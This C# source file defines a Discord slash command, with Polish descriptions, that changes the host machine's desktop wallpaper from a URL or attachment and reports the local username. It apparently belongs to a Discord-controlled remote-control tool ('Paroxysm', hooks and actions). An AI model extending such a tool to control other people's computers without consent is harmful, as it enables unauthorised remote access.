using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Commands.Models;
using Paroxysm.Hooks.Actions;

namespace Paroxysm.Discord.Commands;

public class WallpaperCmd : ISlashCommand
{
    public SlashCommandOptions Options()
    {
        return new SlashCommandOptions
        {
            Name = "wallpaper",
            Description = "Zmienia tapete na wyznaczoną",
            Params =new[] { new SlashCommandOptionParams
            {
                Name = "url",
                Description = "Link do obrazu",
                Type = ApplicationCommandOptionType.String,
                IsRequired = false,
            },
            new SlashCommandOptionParams
            {
                Name = "attachment",
                Description = "Zdjęcie",
                Type = ApplicationCommandOptionType.Attachment,
                IsRequired = false,
            }
            }
        };
    }

    public Embed? Execute(SocketSlashCommand slashCommand)
    {

        slashCommand.RespondAsync(null, new[] { DiscordEmbed.CreateWithText(Color.Blue, "Changing in progress.. please wait", "This command is being executed, it may take few seconds to complete", Environment.UserName, null) }, false, true);
        var parameters = slashCommand.Data;
        
        if (parameters is null)
        {
            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                "Nie podano danych do zdjęcia", Environment.UserName, null);
        }

        object img = parameters.Options.ElementAt(0).Value;

        var res = ChangeWallpaperAction.Follow(img).Result;

        slashCommand.FollowupAsync(null, new[] { res }, false, true);

        return null;
    }
}